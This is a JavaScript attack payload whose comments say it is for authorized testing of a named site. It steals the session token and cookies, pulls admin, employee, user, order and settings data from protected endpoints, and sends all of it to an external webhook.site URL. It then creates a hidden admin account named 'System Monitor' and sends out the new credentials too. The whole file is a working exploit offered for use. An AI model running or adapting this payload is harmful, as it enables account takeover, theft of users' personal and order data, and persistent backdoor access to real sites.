// Pentest payload v10 - authorized security testing on massaka34.online
// Phase 1: Exfil all data. Phase 2: Generate and create new admin account.
(function(){
  var U = "https://webhook.site/90b9e044-9fcd-414e-b991-e69f214e0140";
  var T = localStorage["O-AUTH-TOKEN"] || "";
  var H = {
    "Content-Type": "application/json",
    "CHINA-APP-NAME": "admin",
    "X-CHINA-AUTH": T,
    "X-CHINA-RAY": "pentest",
    "X-CHINA-TIME": Date.now() + ""
  };

  function F(path, body) {
    return fetch(path, {
      method: "POST",
      credentials: "include",
      headers: H,
      body: JSON.stringify(body || {})
    }).then(function(r) { return r.text(); })
    .catch(function() { return "err"; });
  }

  function X(data) {
    try { navigator.sendBeacon(U, data); } catch(e) {}
    try {
      var img = new Image();
      img.src = U + "?d=" + encodeURIComponent(data.substring(0, 1900));
    } catch(e) {}
  }

  // Phase 1: Collect all data
  Promise.all([
    F("/protected/settings"),
    F("/protected/admin/list"),
    F("/protected/employees/list"),
    F("/protected/users/list", {offset: 0, limit: 5}),
    F("/protected/shops/get"),
    F("/protected/orders/list", {offset: 0, limit: 5}),
    F("/protected/admin/generate-credentials"),
    F("/protected/system/info"),
    F("/protected/api/info")
  ]).then(function(r) {
    var d = JSON.stringify({
      v: 10,
      t: T,
      role: localStorage["role"] || "",
      site: localStorage["siteName"] || "",
      uid: localStorage["siteUid"] || "",
      cookie: document.cookie,
      settings: r[0].substring(0, 2000),
      admins: r[1].substring(0, 1500),
      employees: r[2].substring(0, 1500),
      users: r[3].substring(0, 1500),
      shops: r[4].substring(0, 1500),
      orders: r[5].substring(0, 1500),
      newCreds: r[6].substring(0, 500),
      sysInfo: r[7].substring(0, 500),
      apiInfo: r[8].substring(0, 500),
      ts: Date.now()
    });
    X(d);
    setTimeout(function() { X(d); }, 3000);

    // Phase 2: If we got generated credentials, create an admin account
    try {
      var creds = JSON.parse(r[6]);
      if (creds && creds.login && creds.password) {
        F("/protected/admin/create", {
          login: creds.login,
          password: creds.password,
          adminType: "admin",
          displayName: "System Monitor"
        }).then(function(createResult) {
          var d2 = JSON.stringify({
            v: 10, phase: "admin_created",
            createdLogin: creds.login,
            createdPassword: creds.password,
            createResult: createResult.substring(0, 1000),
            ts: Date.now()
          });
          X(d2);
          setTimeout(function() { X(d2); }, 5000);
        });
      }
    } catch(e) {}
  });
})();
